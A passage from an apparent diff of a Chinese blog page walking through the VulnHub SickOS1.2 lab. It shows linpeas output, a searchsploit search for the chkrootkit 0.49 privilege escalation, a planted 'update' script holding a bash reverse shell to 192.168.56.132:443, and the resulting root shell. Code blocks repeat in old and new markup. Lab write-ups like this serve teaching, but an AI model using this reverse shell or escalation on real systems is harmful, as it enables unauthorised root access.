<br>AuthorizedKeysFile      .ssh/authorized_keys<br>Subsystem       sftp    /usr/libexec/sftp-server<br><br><br>╔══════════╣ Analyzing Interesting logs Files (<span class="hljs-built_in">limit</span> 70)<br>            <br>-rw-r--r-- 1 www-data www-data 6927 Apr 19 20:02 /var/log/lighttpd/error.log<br><br>╔══════════╣ Analyzing Other Interesting Files (<span class="hljs-built_in">limit</span> 70)<br>-rw-r--r-- 1 root root 3486 Mar 28  2013 /etc/skel/.bashrc                                              <br>-rw-r--r-- 1 john john 3486 Mar 30  2016 /home/john/.bashrc<br><br>-rw-r--r-- 1 root root 675 Mar 28  2013 /etc/skel/.profile<br>-rw-r--r-- 1 john john 675 Mar 30  2016 /home/john/.profile<br><br><br>╔══════════╣ Cron <span class="hljs-built_in">jobs</span><br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#scheduled-cron-jobs                  </span><br>/usr/bin/crontab                                                                                        <br>incrontab Not Found<br>-rw-r--r-- 1 root root     722 Jun 19  2012 /etc/crontab                                                <br><br>/etc/cron.daily:<br>total 72<br>drwxr-xr-x  2 root root  4096 Apr 12  2016 .<br>drwxr-xr-x 84 root root  4096 Apr 19 20:39 ..<br>-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder<br>-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt<br>-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude<br>-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils<br>-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit<br>-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg<br>-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd<br>-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate<br>-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db<br>-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate<br>-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd<br>-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest<br>-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard<br><br>/etc/cron.hourly:<br>total 12<br>drwxr-xr-x  2 root root 4096 Mar 30  2016 .<br>drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..<br>-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder<br><br>/etc/cron.monthly:<br>total 12<br>drwxr-xr-x  2 root root 4096 Mar 30  2016 .<br>drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..<br>-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder<br><br>/etc/cron.weekly:<br>total 20<br>drwxr-xr-x  2 root root 4096 Mar 30  2016 .<br>drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..<br>-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder<br>-rwxr-xr-x  1 root root  730 Sep 13  2013 apt-xapian-index<br>-rwxr-xr-x  1 root root  907 Dec 28  2012 man-db<br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure></li>
+<li>传linpeas吧。运行一下，记录一下看起来有点说法的东西</li>
 </ol>
+<pre class="line-numbers language-bash"><code class="language-bash">══╣ Some home <span class="token function">ssh</span> config <span class="token function">file</span> was found
+/usr/share/doc/openssh-client/examples/sshd_config                                                      
+AuthorizedKeysFile      .ssh/authorized_keys
+Subsystem       <span class="token function">sftp</span>    /usr/libexec/sftp-server
+
+
+╔══════════╣ Analyzing Interesting logs Files <span class="token punctuation">(</span>limit 70<span class="token punctuation">)</span>
+            
+-rw-r--r-- 1 www-data www-data 6927 Apr 19 20:02 /var/log/lighttpd/error.log
+
+╔══════════╣ Analyzing Other Interesting Files <span class="token punctuation">(</span>limit 70<span class="token punctuation">)</span>
+-rw-r--r-- 1 root root 3486 Mar 28  2013 /etc/skel/.bashrc                                              
+-rw-r--r-- 1 john john 3486 Mar 30  2016 /home/john/.bashrc
+
+-rw-r--r-- 1 root root 675 Mar 28  2013 /etc/skel/.profile
+-rw-r--r-- 1 john john 675 Mar 30  2016 /home/john/.profile
+
+
+╔══════════╣ Cron <span class="token function">jobs</span>
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="token comment" spellcheck="true">#scheduled-cron-jobs                  </span>
+/usr/bin/crontab                                                                                        
+incrontab Not Found
+-rw-r--r-- 1 root root     722 Jun 19  2012 /etc/crontab                                                
+
+/etc/cron.daily:
+total 72
+drwxr-xr-x  2 root root  4096 Apr 12  2016 <span class="token keyword">.</span>
+drwxr-xr-x 84 root root  4096 Apr 19 20:39 <span class="token punctuation">..</span>
+-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
+-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
+-rwxr-xr-x  1 root root   314 Apr 18  2013 <span class="token function">aptitude</span>
+-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
+-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
+-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
+-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
+-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
+-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+-rwxr-xr-x  1 root root   249 Sep 12  2012 <span class="token function">passwd</span>
+-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
+-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 30  2016 <span class="token keyword">.</span>
+drwxr-xr-x 84 root root 4096 Apr 19 20:39 <span class="token punctuation">..</span>
+-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 30  2016 <span class="token keyword">.</span>
+drwxr-xr-x 84 root root 4096 Apr 19 20:39 <span class="token punctuation">..</span>
+-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Mar 30  2016 <span class="token keyword">.</span>
+drwxr-xr-x 84 root root 4096 Apr 19 20:39 <span class="token punctuation">..</span>
+-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+-rwxr-xr-x  1 root root  730 Sep 13  2013 apt-xapian-index
+-rwxr-xr-x  1 root root  907 Dec 28  2012 man-db
+
+SHELL<span class="token operator">=</span>/bin/sh
+PATH<span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+25 6    * * *   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="token punctuation">)</span>
+47 6    * * 7   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="token punctuation">)</span>
+52 6    1 * *   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>逐条验证看下来，只有<code>/etc/cron.daily</code>看起来有点说法，因为下面可执行文件很多，且这些文件每天执行，看看有什么能用的吧。<br>挨个看了看，都是些脚本，没看懂都是干啥的，直接挨个name + exp查一下有没有可以利用的漏洞吧。 </p>
 <ol start="5">
 <li>发现<code>chkrootkit</code>存在提权漏洞。我们先鉴定一下他的版本，<code>chkrootkit -V</code> 0.49,刚好是有漏洞的版本。 </li>
-<li>查查exp： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]<br>└─$ searchsploit chkrootkit 0.4   <br>-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                                                                  |  Path<br>-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Chkrootkit - Local Privilege Escalation (Metasploit)         | linux/local/38775.rb<br>Chkrootkit 0.49 - Local Privilege Escalation                 | linux/local/33899.txt<br>-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure></li>
+<li>查查exp：</li>
 </ol>
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/SickOS1.2/workSpace<span class="token punctuation">]</span>
+└─$ searchsploit chkrootkit 0.4   
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                  <span class="token operator">|</span>  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Chkrootkit - Local Privilege Escalation <span class="token punctuation">(</span>Metasploit<span class="token punctuation">)</span>         <span class="token operator">|</span> linux/local/38775.rb
+Chkrootkit 0.49 - Local Privilege Escalation                 <span class="token operator">|</span> linux/local/33899.txt
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>下载下来看看。  </p>
 <ol start="7">
 <li>开搞之前我们先切换一下shell，因为之前4444是明显不通的，说明有防火墙过滤。所以我们试试8080这种端口，果然可以。 </li>
-<li>开搞 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; update</span><br><span class="hljs-string">&gt; #!/bin/bash</span><br><span class="hljs-string">&gt; bash -i &gt;&amp; /dev/tcp/192.168.56.132/443 0&gt;&amp;1</span><br><span class="hljs-string">&gt; EOF</span><br>$ <span class="hljs-built_in">ls</span><br>VMwareDnD<br>php.socket-0<br>update<br>vgauthsvclog.txt.0<br>vmware-root<br>$ <span class="hljs-built_in">cat</span> update<br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.56.132/443 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li>
+<li>开搞</li>
 </ol>
+<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cat</span> <span class="token operator">&lt;&lt;</span> EOF <span class="token operator">></span> update
+<span class="token operator">></span> <span class="token comment" spellcheck="true">#!/bin/bash</span>
+<span class="token operator">></span> <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.56.132/443 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+<span class="token operator">></span> EOF
+$ <span class="token function">ls</span>
+VMwareDnD
+php.socket-0
+update
+vgauthsvclog.txt.0
+vmware-root
+$ <span class="token function">cat</span> update
+<span class="token comment" spellcheck="true">#!/bin/bash</span>
+<span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.56.132/443 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>写完了，等了半天没反应。难道哪里出问题了？或者说他叫<code>cron.daily</code>我运气不好要等一天？？？ </p>
 <ol start="9">
 <li>急了，尝试怎么直接运行。直接 <code>./chkrootkit</code>没有任何反应。sudo也没权限。直接运行<code>update</code>倒是可以收到shell。网上查了一下怎么运行定时任务，没找到，突然想起定时任务里面运行是用<code>run-parts</code>运行的。试试看，文件夹下运行出错，查查看了下<code>run-parts</code>。发现他会运行指定文件下第一层的所有可执行文件。 </li>
-<li>试试<code>run-parts /etc/cron.daily</code><br>OK，收到了捏。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>192.168.56.136: inverse host lookup failed: Host name lookup failure<br>connect to [192.168.56.132] from (UNKNOWN) [192.168.56.136] 57899<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@ubuntu:~<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@ubuntu:~<span class="hljs-comment"># cd ~</span><br><span class="hljs-built_in">cd</span> ~<br>root@ubuntu:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz<br>7d03aaa2bf93d80040f3f22ec6ad9d5a.txt<br>chkrootkit-0.49<br>newRule<br>root@ubuntu:~<span class="hljs-comment"># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="hljs-built_in">cat</span> 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt<br>WoW! If you are viewing this, You have <span class="hljs-string">&quot;Sucessfully!!&quot;</span> completed SickOs1.2, the challenge is more focused on elimination of tool <span class="hljs-keyword">in</span> real scenarios <span class="hljs-built_in">where</span> tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though <span class="hljs-keyword">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.<br><br>Thanks <span class="hljs-keyword">for</span> giving this try.<br><br>@vulnhub: Thanks <span class="hljs-keyword">for</span> hosting this UP!.<br>root@ubuntu:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure></li>
+<li>试试<code>run-parts /etc/cron.daily</code><br>OK，收到了捏。</li>
 </ol>
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> nc -lvp 443
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 443 <span class="token punctuation">..</span>.
+192.168.56.136: inverse host lookup failed: Host name lookup failure
+connect to <span class="token punctuation">[</span>192.168.56.132<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>192.168.56.136<span class="token punctuation">]</span> 57899
+bash: no job control <span class="token keyword">in</span> this shell
+root@ubuntu:~<span class="token comment" spellcheck="true"># whoami</span>
+<span class="token function">whoami</span>
+root
+root@ubuntu:~<span class="token comment" spellcheck="true"># cd ~</span>
+<span class="token function">cd</span> ~
+root@ubuntu:~<span class="token comment" spellcheck="true"># ls</span>
+<span class="token function">ls</span>
+304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
+7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+chkrootkit-0.49
+newRule
+root@ubuntu:~<span class="token comment" spellcheck="true"># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span>
+<span class="token function">cat</span> 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+WoW<span class="token operator">!</span> If you are viewing this, You have <span class="token string">"Sucessfully!!"</span> completed SickOs1.2, the challenge is <span class="token function">more</span> focused on elimination of tool <span class="token keyword">in</span> real scenarios where tools can be blocked during an assesment and thereby fooling tester<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, gathering <span class="token function">more</span> information about the target using different methods, though <span class="token keyword">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
+
+Thanks <span class="token keyword">for</span> giving this try.
+
+@vulnhub: Thanks <span class="token keyword">for</span> hosting this UP<span class="token operator">!</span>.
+root@ubuntu:~<span class="token comment" spellcheck="true">#</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>目录下还有个newRules，再看一眼也不会爆炸<br>破案了，确实是只有<code>8080</code> ,<code>443</code>,<code>22</code>,<code>80</code>没有被过滤掉。<br>为啥直接想到<code>8080</code> ,<code>443</code>？<br>因为一般为了保证web服务正常，这两端口一般都不会过滤掉的。 </p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/THE%20PLANET_%20MERCURY/">← Next [vulnhub]  The Planets: Mercury</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/kenobi/">[THM]  kenobi Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">1.2.</span> <span class="toc-text">nikto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-fingerprint"><span class="toc-number">1.3.</span> <span class="toc-text">Web fingerprint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.4.</span> <span class="toc-text">web</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-number">3.</span> <span class="toc-text">提升权限</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/THE%20PLANET_%20MERCURY/">← Next [vulnhub]  The Planets: Mercury</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/kenobi/">[THM]  kenobi Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">1.2.</span> <span class="toc-text">nikto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-fingerprint"><span class="toc-number">1.3.</span> <span class="toc-text">Web fingerprint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.4.</span> <span class="toc-text">web</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number"></span> <span class="toc-text">417 - Expectation Failed</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-number">1.</span> <span class="toc-text">提升权限</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
 document.querySelector('.lg-container')?.remove()
 lightGallery(document.getElementById('post-bg'), {
   plugins: [lgZoom,lgThumbnail],
